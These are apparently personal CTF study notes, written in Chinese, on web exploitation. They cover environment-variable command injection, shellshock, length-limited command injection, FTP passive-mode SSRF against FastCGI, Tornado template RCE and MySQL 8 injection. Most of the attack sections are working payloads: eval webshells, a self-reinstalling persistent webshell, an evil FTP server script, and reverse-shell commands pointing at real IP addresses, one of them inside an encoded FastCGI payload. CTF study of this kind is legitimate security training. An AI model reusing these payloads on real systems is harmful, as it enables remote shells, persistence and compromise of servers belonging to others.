**set**
**env**
**export**
**declare**命令的异同

set命令显示当前[shell](http://jidiblog.blog.51cto.com/140821/282481)的变量，包括当前用户的变量

env命令显示当前用户的变量;

export命令显示当前
**导出成用户变量**的shell变量

declare命令可以明确进行变量类型的声明。

declare [+/-] [变换选项] 变量名

shell默认是字符串型，如果需要加减乘除，需要定义为整型

declare命令：改变默认变量的类型

-给变量设定类型属性

+取消变量类型属性

-a声明为数组类型

-i声明为整型

-x 将变量设置为环境变量 相当于export命令 declare -x test=123（export是简化命令。最终执行的是declare -x命令）

-r 讲变量声明为只读变量

-p 显示指定变量的被声明的类型

每个shell有自己特有的变量（set）显示的变量，这个和用户变量是不同的，当前用户变量和你用什么shell无关，不管你用什么shell都在，比如HOME，SHELL等这些变量，但shell自己的变量不同shell是不同的，比如BASH_ARGC，BASH等，这些变量只有set才会显示，是bash特有的，export不加参数的时候，显示哪些变量被导出成了用户变量，因为一个shell自己的变量可以通过export “导出”变成一个用户变量。

前面学过Shell是一个弱类型的语言，默认情况下给变量赋什么值都是字符串型，不能直接进行数值运算。declare命令可以明确进行变量类型的声明。

```php
<?php

$env = $_GET['env'];
if(isset($env)){
    putenv($env);
    system("whoami");
}else{
    highlight_file(__FILE__);
}
```

php system执行的是 sh -c

 `env=BASH_FUNC_whoami%%=() { cat /flag; }`

- `BASH_ENV`：可以在`bash -c`的时候注入任意命令
- `ENV`：可以在`sh -i -c`的时候注入任意命令
- `PS1`：可以在`sh`或`bash`交互式环境下执行任意命令
- `PROMPT_COMMAND`：可以在`bash`交互式环境下执行任意命令
- `BASH_FUNC_xxx%%`：可以在`bash -c`或`sh -c`的时候执行任意命令

### 破壳漏洞

以上

- shellshock漏洞:`TEST=(){:;};id;`,`env 'TEST=(){:;};id' bash -c "echo Hello"`
- bash4.4之前:`env $'BASH_FUNC_echo()=(){id;}' bash -c "echo hello"`
- 4.4之后:`env $'BASH_FUNC_echo()%%=(){id;}' bash -c "echo hello"`

## 图片马

``<?=`$_GET[1]`;;?>``

严格限制了图片类型，不仅需要通过getimagesize,还要比对mine信息，最后还要进行base64解码

图片位置在`/Users/dionysus/CTF/文件上传/web814base64.jpg`

## 命令注入长度限制绕过

### 15字符

如需执行 echo \<?php eval($_GET[1]);?\>>1

```php
echo \<?php >1//创建一个1的文件 并把内容写入
echo eval\(>>1
echo \$_GET>>1
echo \[1\]>>1
echo \)\;?>>1
```

### 7字符

1>a或者w>b分别可以创建a和b两个空文件夹。

ls>c会将目录下面的文件名写入到c文件中；ls -t>0会将文件名按照创建的时间倒叙写入0文件中。并且自动换行。

\作为转义符，转义之后的'\'是用来换行分隔，也就是换行也是连接的。

```php
ca\
t
这就代表cat
```

例如这样的代码：

```php
<?php
if(strlen($_GET[1])<8){
     echo shell_exec($_GET[1]);
}
?>
```

假设我产要写入`<?php echo phpinfo();echo PD9waHAgcGhwaW5mbygpOw== | base64 -d >1.php`

```bash
w>hp
w>1.p\\
w>d\>\\
w>\-\\
w>e64\\
w>bas\\
w>=\|\\
w>w=\\
w>gpO\\
w>mby\\
w>aW5\\
w>Ghw\\
w>Agc\\
w>waH\\
w>PD9\\
w>o\ \\
w>ech\\

ls -t>0

sh 0
```

倒叙新建文件名，然后通过ls -t>0，将刚才的顺序再倒序然后写入到0文件中，然后用sh将0当作脚本执行。

web821`GET`型木马转成了`POST`型木马,不知原因

web822 阴间题,不可写,放入临时文件进行反弹shell

最后flag位置更逆天

```php
<?php
$conn = new mysqli('localhost', 'root', 'root', 'ctfshow');
if ($conn->connect_error) {
    die('Connection failed: ' . $conn->connect_error);
}
$sql = 'SELECT `secret` FROM `ctfshow_secret` ORDER BY 1 DESC LIMIT 0,20;';
$result = $conn->query($sql);
if ($result->num_rows > 0) {
    while($row = $result->fetch_assoc()) {
        echo $row['secret'] . '<br>';
    }
} else {
    echo '0 results';
}
$conn->close();
?>
```

### 5字符

ls -t>0 超过了5位

```bash
>ls\\
ls>a
>\ \\
>-t\\
>\>0

ls>>a
```

这就将ls -t>0写在了a脚本中，如果要用的话直接sh a，之后写入自己的命令按照7位的逻辑写就行了。

Web 823 思路是

- 把index.php变成.php
- 讲临时文件打包到当前目录
- 使用php执行tar压缩包

### 4字符

```bash
>f\>
>ht-
>sl
>dir
*>v
>rev
*v>0

cat 0
```

这就将ls -th>f写入到了脚本0当中，后面就可以直接按照7位的那样写入我们要执行的命令，最后使用sh 0执行ls -th>f，然后将命令写入了f脚本中，执行sh f即可。

web821开始的脚本在rce/字符限制里

绷不住了,太阴间了,脚本留着,很多都没打通,下班!

## ftp被动模式

**Port**(主动)

FTP 客户端首先和 FTP 服务器的 TCP 21  端口建立连接，通过这个通道发送控制命令。控制连接建立后，如果客户端需要接收数据，则在这个控制通道上发送 PORT 命令。 PORT  命令包含了客户端用什么端口接收数据（PORT 命令的格式比较特殊）。在传送数据的时候，服务器端通过自己的 TCP 20 端口连接至客户端用  PORT 命令指定的端口发送数据。 可见，FTP 服务器必须主动和客户端建立一个新的连接用来传送数据。

**Passive**(被动)

在建立控制通道的时候和 Standard 模式类似，都是 FTP 客户端和 FTP 服务器的 TCP 21  端口建立连接，但建立连接后发送的不是 PORT 命令，而是 PASV 命令。FTP 服务器收到 PASV  命令后，随机打开一个高端端口（端口号大于1024）并且通知客户端在这个端口上传送数据的请求，客户端连接到 FTP  服务器的此高端端口，通过三次握手建立通道，然后 FTP 服务器将通过这个端口进行数据的传送。

> 简单地说，主动模式和被动模式这两种模式是按照 FTP 服务器的 “角度” 来说的，更通俗一点说就是：在传输数据时，如果是服务器主动连接客户端，那就是主动模式；如果是客户端主动连接服务器，那就是被动模式。

可见，在被动方式中，FTP  客户端和服务端的数据传输端口是由服务端指定的，而且还有一点是很多地方没有提到的，实际上除了端口，服务器的地址也是可以被指定的。由于 FTP 和  HTTP 类似，协议内容全是纯文本，所以我们可以很清晰的看到它是如何指定地址和端口的：

```python
227 Entering Passive Mode(192,168,9,2,4,8)
```

227 和 Entering Passive Mode 类似 HTTP 的状态码和状态短语，而 `(192,168,9,2,4,8)` 代表让客户端到连接 192.168.9.2 的 4 * 256 + 8 = 1032 端口。

这样，假如我们指定 `(127,0,0,1,0,9000)` ，那么便可以将地址和端口指到  127.0.0.1:9000，也就是本地的 9000 端口。同时由于 FTP 的特性，其会把传输的数据原封不动的发给本地的 9000  端口，不会有任何的多余内容。如果我们将传输的数据换为特定的 Payload 数据，那我们便可以攻击内网特定端口上的应用了。在这整个过程中，FTP 只起到了一个重定向 Payload 的内容。

```php
<?php
file_put_contents($_GET['file'], $_GET['data']);
```

在不能写文件的环境下我们如何才能实现 RCE 呢？那么这个时候我们便可以从 FTP 的被动模式入手，通过 SSRF 攻击内网应用。

首先使用 Gopherus生成 Payload：

```bash
python gopherus.py --exploit fastcgi
/var/www/html/index.php  # 这里输入的是目标主机上一个已知存在的php文件
bash -c "bash -i >& /dev/tcp/107.172.141.31/9999 0>&1"  # 这里输入的是要执行的命令
```

Vps 上运行exp.py并监听9999端口

```py
#exp.py
# evil_ftp.py
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.bind(('0.0.0.0', 23))
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n') #STOR / (2)
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()
```

`/?file=ftp://aaa@47.101.57.72:23/123&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH104%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00h%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/47.101.57.72/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00`

复现失败,日后本地搭建

记录两个题

## 权限维持

### 不死马

这个其实也不算

小tip`.bk.php`等`.`开头的文件不会被`rm -rf *`删除哦

```php
<?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = 'shell.php';
    $code = '<?php @eval($_POST[1]);?>';
    while (1) {
        file_put_contents($file, $code);
        usleep(5000);
    }
?>
 

```

接下来没有写入权限`cmd=system('while true;do cat /tmp/f*;done');`死循环

### md5数字字符绕过

```php
<?php
    if(sha1(12) === sha1('12') && md5(1) === md5('1')){
        echo("666");
    }
    else{
        echo("777");
    }
?>
//输出结果是666

```

长知识了

### tornade `__tt_utf8(__tt_tmp)`

tornado模版在渲染时会执行`__tt_utf8(__tt_tmp)` 这样的函数，所以将`__tt_utf8`设置为`eval`，然后将__tt_tmp设置为了从POST方法中接收的字符串导致了RCE

```bash
{% set _tt_utf8 =eval %}{% raw request.body_arguments[request.method][0] %}&POST=__import__('os').popen("bash -c 'bash -i >%26 /dev/tcp/vps-ip/port <%261'")
```

### mysql8.0

#### table

table和select很像

```sql
TABLE t;
SELECT * FROM t;
```

结果一样

区别:

- TABLE始终显示表的所有列；
- TABLE不允许对行进行任意过滤，也就是说，TABLE不支持任何WHERE子句；

##### TABLE替换SELECT xx INTO OUTFILE的SELECT

> secure_file_priv参数用于限制`LOAD DATA`、`SELECT xx INTO OUTFILE`、`LOAD_FILE()`等：
>
> - NULL：表示限制mysqld不允许导入或导出；
> - /tmp：表示限制mysqld只能在/tmp目录中执行导入导出，其他目录不能执行；
> - 没有值：表示不限制mysqld在任意目录的导入导出；
>
> 在my.ini加入`secure_file_priv=''`重启MYSQL服务

##### TABLE替代DUMPFILE的SELECT

- OUTFILE导出全部数据，DUMPFILE只能导出一行数据；
- OUTFILE在将数据写到文件里时有特殊的格式转换，而DUMPFILE则保持原数据格式

```sql
table security.users limit 1 into dumpfile '/tmp/dump.txt'
```

##### 子查询替代

只有单列的时候适用,多列报错

#### VALUES

##### union联合查询

```mysql
原:select * from test.users union select 1,2,3;
新:select * from test.users union values row(1,2,3);

同样也可以判段列数
select * from test.users where id ='0' union values row(1,2);
select * from test.users where id ='0' union values row(1,2,3);
注入
select * from test.users where id ='0' union values row(1,database(),version());
concat
select * from test.users where id ='0' union values row(concat_ws(char(32,58,32),user(),database(),version()),database(),version());
子查询
select * from test.users where id ='0' union values row((select group_concat(concat_ws(char(32,58,32),id,username,password)) from users),database(),version());

```

#### 盲注
